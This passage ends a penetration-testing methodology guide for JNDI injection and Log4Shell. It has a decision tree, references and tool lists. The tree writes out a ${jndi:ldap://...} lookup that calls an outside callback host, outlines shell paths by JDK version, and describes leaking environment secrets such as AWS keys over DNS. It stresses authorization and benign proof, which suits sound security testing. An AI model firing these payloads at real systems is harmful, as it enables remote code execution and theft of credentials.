│ 5. VALIDATE→REPORT: callback-is-proof FP filter §16 · CVSS 10.0/CWE-917 §17 │
│    SAFE-PoC: OOB canary → one benign id/${env}, NO shells §19 · dedup §20   │
└──────────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — Decision tree

```
Target is Java + you can influence a logged/looked-up input? §2-§3
│
├─ Fire ${jndi:ldap://TOKEN.oob/} (per input). Callback? §4
│     ├─ NO  → try nested-lookup obfuscation §6 ; try dns:// §7 ; try other inputs/headers ; else likely patched/not-Java.
│     └─ YES (target-sourced DNS/LDAP, your token) → CONFIRMED JNDI/Log4Shell (blind RCE). CRITICAL ⭐
│
├─ LDAP connect too (not just DNS)? → full RCE path open → pick technique by JVM state §9:
│     ├─ JDK pre-Oct-2018 (trustURLCodebase=true) → A remote codebase → shell.
│     ├─ modern JDK → C BeanFactory/EL (Tomcat) or B serialized gadget (classpath) → shell.
│     └─ authorized? one benign `id`, then STOP §19.
│
├─ DNS only (LDAP egress filtered) OR Log4j 2.15 → ${env:AWS_SECRET_...} exfil over DNS §11 → HIGH/CRIT data theft.
│
└─ Non-Log4j Java sink (H2 console / JDBC URL / lookup(userInput) / logback config)? → product-specific JNDI §14.

ALWAYS: OOB callback carrying YOUR token = proof (not reflection) · benign only · tear down servers · CWE-917 §17.
```

---

# Appendix C — References & further reading

**Class-defining research**
- **Alvaro Muñoz & Oleksandr Mirosh** — "A Journey From JNDI/LDAP Manipulation to Remote Code Execution Dream Land" (Black Hat USA 2016) — the seminal JNDI-injection paper.
- **Veracode / Michael Stepankin** — "Exploiting JNDI Injections in Java" (the local-factory / BeanFactory-EL bypass): https://www.veracode.com/blog/research/exploiting-jndi-injections-java
- **LunaSec** — Log4Shell explainer & timeline: https://www.lunasec.io/docs/blog/log4j-zero-day/
- **Cloudflare / GovCERT / SwitHak** — Log4Shell analysis & IoCs.

**Core methodology**
- HackTricks — JNDI / Log4Shell: https://book.hacktricks.xyz/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell
- PayloadsAllTheThings — Java (Log4Shell/JNDI): https://github.com/swisskyrepo/PayloadsAllTheThings
- Apache Log4j Security advisories (the CVE chain): https://logging.apache.org/log4j/2.x/security.html
- OWASP — Log4Shell / dependency-check guidance.

**Tools**
- **marshalsec** (LDAP/RMI referral servers, serialized-gadget path): https://github.com/mbechler/marshalsec
- **ysoserial** (gadget chains for technique B): https://github.com/frohoff/ysoserial
- **JNDI-Injection-Exploit** (@welk1n): https://github.com/welk1n/JNDI-Injection-Exploit · **rogue-jndi** (veracode-research) · **JNDIExploit** (feihong-cs)
- **log4j-scan** (fullhunt): https://github.com/fullhunt/log4j-scan · **nuclei** `-tags log4j,jndi` · **interactsh** (OOB)

**Standards**
- **CWE-917** (Expression Language Injection): https://cwe.mitre.org/data/definitions/917.html · **CWE-74** · **CWE-502** (Deserialization) · **CWE-400** (DoS)
- **CVE-2021-44228** (Log4Shell, CVSS 10.0) + 45046 / 45105 / 44832; **CVSS 3.1** calculator: https://www.first.org/cvss/calculator/3.1

---

## Companion files
- **[JNDI_ARSENAL.md](JNDI_ARSENAL.md)** — payload matrix (protocols · nested-lookup WAF bypass · `${env}` exfil), inject-point list, tools.
- **[JNDI_CHECKLIST.md](JNDI_CHECKLIST.md)** — phase-by-phase + auto-reject.
- **[JNDI_REPORT_TEMPLATE.md](JNDI_REPORT_TEMPLATE.md)** — report skeleton (OOB-callback proof).
- **[JNDI_Zero_to_Expert.md](JNDI_Zero_to_Expert.md)** — 100-question study + field reference.
- **[poc/](poc/)** — `jndi_probe.py` (per-input token spray) · `payload_gen.py` (payload matrix) · `callback_listener.py` (benign connection logger).

> **Final reminder — the one rule that pays:** JNDI/Log4Shell is confirmed when the **target's own infrastructure calls back to your OOB host carrying your unique token** — that blind callback is already **Critical unauthenticated RCE** (or, on a partly-patched host, `${env}` **secret theft over DNS**). Prove *that*, optionally one benign command, and stop. You never need a shell to win this one.
